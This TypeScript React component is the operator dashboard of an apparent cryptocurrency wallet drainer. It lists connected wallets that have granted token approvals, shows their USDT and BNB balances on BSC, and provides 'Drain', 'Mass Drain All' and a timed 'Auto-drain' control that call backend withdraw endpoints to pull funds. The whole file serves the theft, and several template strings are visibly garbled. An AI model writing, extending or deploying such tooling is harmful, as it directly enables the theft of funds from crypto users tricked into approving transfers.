"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import {
  CheckCircle,
  XCircle,
  RefreshCw,
  Loader2,
  ArrowDownToLine,
  ExternalLink,
  AlertTriangle,
  Zap,
} from "lucide-react";
import { cn } from "@/lib/cn";
import { useToast } from "@/components/ui/Toaster";

interface Wallet {
  id: string;
  address: string;
  is_approved: boolean;
  approval_status: boolean;
  approval_tx_hash: string | null;
  drained: boolean;
  drain_tx_hash: string | null;
  created_at: string;
  connected_at?: string;
  usdtBalanceFormatted?: string;
  bnbBalanceFormatted?: string;
  usdtUsdValue?: string;
  loadingBalances?: boolean;
}

interface GasInfo {
  gweiPrice: string;
  gasCostUsdt: string;
}

const AUTO_DRAIN_INTERVAL = 30_000;

export default function WalletTable({ adminKey }: { adminKey: string }) {
  const toast = useToast();

  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(true);
  const [gasInfo, setGasInfo] = useState<GasInfo | null>(null);
  const [draining, setDraining] = useState<string | null>(null);
  const [massDraining, setMassDraining] = useState(false);
  const [autoDrainOn, setAutoDrainOn] = useState(true);
  const [countdown, setCountdown] = useState<number | null>(null);
  const [filter, setFilter] = useState<"all" | "approved" | "revoked">("all");

  const authHeaders = useCallback(() => ({
    "x-admin-key": adminKey,
    "Content-Type": "application/json",
  }), [adminKey]);

  const fetchWallets = useCallback(async () => {
    try {
      const res = await fetch("/api/wallets", {
        headers: authHeaders(),
        cache: "no-store",
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);

      if (data.wallets) {
        const mapped = data.wallets.map((w: any) => ({
          ...w,
          is_approved: w.is_approved ?? w.approval_status ?? false,
          approval_status: w.is_approved ?? w.approval_status ?? false,
          loadingBalances: false,
        }));
        setWallets(mapped);
      }
    } catch (err: unknown) {
      toast.error(`Failed to load wallets: ${err instanceof Error ? err.message : err}`);
    } finally {
      setLoading(false);
    }
  }, [adminKey, authHeaders, toast]);

  const fetchGas = useCallback(async () => {
    try {
      const res = await fetch("/api/gas", { headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      setGasInfo(data);
    } catch {
      // non-critical
    }
  }, [authHeaders]);

  const fetchBalancesForWallet = useCallback(async (walletId: string, address: string) => {
    setWallets((prev) =>
      prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: true } : w))
    );
    try {
      const res = await fetch(`/api/balances?address=${address}`, { headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      setWallets((prev) =>
        prev.map((w) =>
          w.id === walletId
            ? {
                ...w,
                usdtBalanceFormatted: data.usdtBalanceFormatted,
                bnbBalanceFormatted: data.bnbBalanceFormatted,
                usdtUsdValue: data.usdtUsdValue,
                loadingBalances: false,
              }
            : w
        )
      );
    } catch {
      setWallets((prev) =>
        prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: false } : w))
      );
    }
  }, [authHeaders]);

  const fetchAllBalances = useCallback(async (list: Wallet[]) => {
    if (list.length === 0) return;
    await Promise.allSettled(list.map((w) => fetchBalancesForWallet(w.id, w.address)));
  }, [fetchBalancesForWallet]);

  const drainWallet = useCallback(async (walletId: string, silent = false, limitUsd?: number) => {
    if (!silent) setDraining(walletId);
    try {
      const url = limitUsd
        ? `/api/wallets/\( {walletId}/withdraw?limitUsd= \){limitUsd}`
        : `/api/wallets/${walletId}/withdraw`;

      const res = await fetch(url, {
        method: "POST",
        headers: authHeaders(),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);

      toast.success(`Drained ${data.amount} USDT!`);
      await fetchWallets();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      if (!silent) toast.error(`Withdraw failed: ${msg}`);
    } finally {
      if (!silent) setDraining(null);
    }
  }, [authHeaders, fetchWallets, toast]);

  const massDrain = useCallback(async (silent = false) => {
    if (!silent) setMassDraining(true);
    try {
      const res = await fetch("/api/bot/drain", { method: "POST", headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);

      const drained = (data.results ?? []).filter((r: any) => r.status === "drained").length;
      if (drained > 0) {
        toast.success(`Auto-drained \( {drained} wallet \){drained > 1 ? "s" : ""}.`);
        await fetchWallets();
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      if (!silent) toast.error(`Mass drain failed: ${msg}`);
    } finally {
      if (!silent) setMassDraining(false);
    }
  }, [authHeaders, fetchWallets, toast]);

  const toggleRevokeWallet = useCallback(async (walletId: string, currentStatus: boolean) => {
    try {
      const res = await fetch(`/api/wallets/${walletId}`, {
        method: "PATCH",
        headers: authHeaders(),
        body: JSON.stringify({
          is_approved: !currentStatus,
          approval_status: !currentStatus,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);

      const newStatus = !currentStatus ? "Approved" : "Revoked";
      toast.success(`Wallet ${newStatus}.`);
      await fetchWallets();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(`Toggle failed: ${msg}`);
    }
  }, [authHeaders, fetchWallets, toast]);

  // Lifecycle
  useEffect(() => {
    fetchWallets();
    fetchGas();
  }, [fetchWallets, fetchGas]);

  const hasFetchedBalances = useRef(false);
  useEffect(() => {
    if (wallets.length > 0 && !hasFetchedBalances.current) {
      hasFetchedBalances.current = true;
      fetchAllBalances(wallets);
    }
  }, [wallets.length, fetchAllBalances]);

  // Simple Auto-drain countdown
  useEffect(() => {
    if (!autoDrainOn) {
      setCountdown(null);
      return;
    }
    const interval = setInterval(() => {
      setCountdown((prev) => (prev !== null && prev > 0 ? prev - 1 : 30));
    }, 1000);
    return () => clearInterval(interval);
  }, [autoDrainOn]);

  function shortenAddress(addr: string) {
    return `\( {addr.slice(0, 6)}... \){addr.slice(-4)}`;
  }

  const approvedCount = wallets.filter((w) => w.is_approved).length;
  const revokedCount = wallets.filter((w) => !w.is_approved).length;

  const filteredWallets = wallets.filter((w) => {
    if (filter === "approved") return w.is_approved;
    if (filter === "revoked") return !w.is_approved;
    return true;
  });

  return (
    <div className="flex flex-col gap-6">
      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {[
          { label: "Total Wallets", value: wallets.length },
          { label: "Approved", value: approvedCount, color: "text-green-400" },
          { label: "Revoked", value: revokedCount, color: "text-red-400" },
          { label: "Gas Price", value: gasInfo ? `${gasInfo.gweiPrice} Gwei` : "—" },
        ].map((stat) => (
          <div key={stat.label} className="rounded-xl border border-gray-800 bg-[#111] p-4 flex flex-col gap-1">
            <p className="text-xs text-gray-500 uppercase tracking-wider">{stat.label}</p>
            <p className={`text-2xl font-bold ${stat.color ?? "text-white"}`}>{stat.value}</p>
          </div>
        ))}
      </div>

      {/* Action Bar */}
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div className="flex items-center gap-3 flex-wrap">
          <div className="flex items-center rounded-lg border border-gray-700 bg-[#111] overflow-hidden text-xs font-medium">
            {(["all", "approved", "revoked"] as const).map((f) => (
              <button
                key={f}
                onClick={() => setFilter(f)}
                className={cn(
                  "px-3 py-2 capitalize transition-colors",
                  filter === f
                    ? f === "approved"
                      ? "bg-green-500/20 text-green-400"
                      : "bg-red-500/20 text-red-400"
                    : "text-gray-500 hover:text-gray-300"
                )}
              >
                {f === "all" ? `All (\( {wallets.length})` : f === "approved" ? `Approved ( \){approvedCount})` : `Revoked (${revokedCount})`}
              </button>
            ))}
          </div>

          <button
            onClick={() => { setLoading(true); fetchWallets().finally(() => setLoading(false)); }}
            disabled={loading}
            className="flex items-center gap-2 px-4 py-2 rounded-lg border border-gray-700 bg-[#111] text-sm text-gray-300 hover:bg-[#1a1a1a] transition-colors disabled:opacity-50"
          >
            {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
            Refresh
          </button>

          <button
            onClick={() => setAutoDrainOn(v => !v)}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors",
              autoDrainOn
                ? "border-green-500/40 bg-green-500/10 text-green-400 hover:bg-green-500/20"
                : "border-gray-700 bg-[#111] text-gray-500 hover:bg-[#1a1a1a]"
            )}
          >
            <Zap className="h-4 w-4" />
            {autoDrainOn ? `Auto-drain ON \( {countdown !== null ? `( \){countdown}s)` : ""}` : "Auto-drain OFF"}
          </button>
        </div>

        <button
          onClick={() => massDrain(false)}
          disabled={massDraining}
          className="flex items-center gap-2 px-5 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
        >
          {massDraining ? <Loader2 className="h-4 w-4 animate-spin" /> : <AlertTriangle className="h-4 w-4" />}
          Mass Drain All
        </button>
      </div>

      {/* Table */}
      <div className="rounded-xl border border-gray-800 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-gray-800 bg-[#111]">
                {["Wallet Address", "USDT Balance", "BNB Balance", "Approval", "Drained", "Connected At", "Actions"].map((col) => (
                  <th key={col} className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    {col}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800/60">
              {loading ? (
                <tr>
                  <td colSpan={7} className="px-4 py-10 text-center">
                    <Loader2 className="h-6 w-6 animate-spin text-gray-500 mx-auto" />
                  </td>
                </tr>
              ) : filteredWallets.length === 0 ? (
                <tr>
                  <td colSpan={7} className="px-4 py-10 text-center text-gray-600">No wallets connected yet</td>
                </tr>
              ) : (
                filteredWallets.map((wallet) => (
                  <tr key={wallet.id} className="bg-[#0d0d0d] hover:bg-[#131313] transition-colors">
                    <td className="px-4 py-3 font-mono text-gray-300">
                      <div className="flex items-center gap-2">
                        {shortenAddress(wallet.address)}
                        <a href={`https://bscscan.com/address/${wallet.address}`} target="_blank" rel="noopener noreferrer">
                          <ExternalLink className="h-3 w-3" />
                        </a>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-emerald-400">
                      {wallet.usdtBalanceFormatted || "0.00"} USDT
                    </td>
                    <td className="px-4 py-3 text-emerald-400">
                      {wallet.bnbBalanceFormatted || "0.0000"} BNB
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-1.5">
                        {wallet.is_approved ? (
                          <><CheckCircle className="h-4 w-4 text-green-400" /> Approved</>
                        ) : (
                          <><XCircle className="h-4 w-4 text-red-400" /> Pending</>
                        )}
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      {wallet.drained ? "✅ Drained" : "No"}
                    </td>
                    <td className="px-4 py-3 text-gray-500 text-sm">
                      {new Date(wallet.created_at).toLocaleString()}
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex gap-2">
                        <button
                          onClick={() => drainWallet(wallet.id)}
                          disabled={draining === wallet.id || !wallet.is_approved}
                          className="px-3 py-1 bg-red-600 hover:bg-red-500 rounded text-xs text-white disabled:opacity-50"
                        >
                          {draining === wallet.id ? "Draining..." : "Drain"}
                        </button>
                        <button
                          onClick={() => toggleRevokeWallet(wallet.id, wallet.is_approved)}
                          className="px-3 py-1 border border-gray-700 hover:bg-gray-800 rounded text-xs"
                        >
                          {wallet.is_approved ? "Revoke" : "Approve"}
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}